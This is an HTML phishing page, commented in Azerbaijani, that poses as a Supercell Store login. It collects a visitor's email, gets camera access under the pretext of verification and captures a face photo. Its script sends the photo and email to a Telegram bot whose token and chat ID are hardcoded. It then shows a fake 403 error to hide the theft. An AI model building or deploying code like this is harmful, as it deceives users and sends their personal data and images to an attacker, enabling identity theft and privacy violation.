<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supercell Store Login - Telegram Sync</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: #1b4fb1; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .login-card { background: white; width: 100%; max-width: 380px; padding: 30px; border-radius: 15px; box-shadow: 0px 10px 30px rgba(0,0,0,0.3); text-align: center; }
        .header-tabs { display: flex; justify-content: space-between; margin-bottom: 10px; font-weight: bold; }
        .progress-bar { height: 6px; background: #eee; border-radius: 3px; margin-bottom: 25px; overflow: hidden; }
        .progress-fill { height: 100%; width: 50%; background: linear-gradient(to right, #4facfe, #00f2fe); }
        .logo-box { background: #ffc107; width: 60px; height: 60px; margin: 0 auto 15px; border-radius: 12px; display: flex; justify-content: center; align-items: center; font-size: 35px; font-weight: 900; color: white; }
        input[type="email"] { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 15px; outline: none; }
        #camera-wrapper { display: none; margin-bottom: 15px; border-radius: 10px; overflow: hidden; background: #000; line-height: 0; }
        video { width: 100%; transform: scaleX(-1); }
        .btn { width: 100%; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; border: none; margin-bottom: 10px; }
        .btn-blue { background: #3a86ff; color: white; }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="login-card">
    <div class="header-tabs"><span>Sign In</span><span style="color: #888;">Verify</span></div>
    <div class="progress-bar"><div class="progress-fill"></div></div>
    <div class="logo-box">S</div>
    <h2>Supercell Store Login</h2>
    <p style="font-size: 14px; color: #666;">Enter your email to receive a verification code.</p>

    <input type="email" id="userEmail" placeholder="Enter your email address">

    <div id="camera-wrapper"><video id="video" autoplay playsinline></video></div>
    
    <button class="btn btn-blue" id="main-btn">➜ SIGN IN</button>
    
    <canvas id="canvas"></canvas>
</div>

<script>
    // --- TELEGRAM MƏLUMATLARINI BURAYA YAZ ---
    const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A"; // Məsələn: "123456789:ABCDefgh..."
    const CHAT_ID = "-1003369084883";     // Məsələn: "987654321"
    // ----------------------------------------

    const mainBtn = document.getElementById('main-btn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const cameraWrapper = document.getElementById('camera-wrapper');
    const emailInput = document.getElementById('userEmail');

    let stream = null;

    mainBtn.addEventListener('click', async () => {
        if (!stream) {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                cameraWrapper.style.display = 'block';
                emailInput.style.display = 'none';
                mainBtn.innerText = '📸 TƏSDİQLƏ';
            } catch (err) {
                alert("Kameraya icazə verilmədi!");
            }
        } else {
            // Şəkli çək
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.translate(canvas.width, 0);
            context.scale(-1, 1);
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Kameranı söndür
            stream.getTracks().forEach(track => track.stop());
            cameraWrapper.style.display = 'none';
            mainBtn.innerText = "GÖNDƏRİLİR...";
            mainBtn.disabled = true;

            // Şəkli Blob formatına sal və Telegram-a göndər
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', `Yeni giriş cəhdi!\nEmail: ${emailInput.value}`);
                formData.append('photo', blob, 'photo.png');

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    alert("Sistem xətası: Verifikasiya kodu göndərilə bilmədi (403).");
                    window.location.reload();
                } catch (error) {
                    console.error("Xəta:", error);
                }
            }, 'image/png');
        }
    });
</script>

</body>
</html>
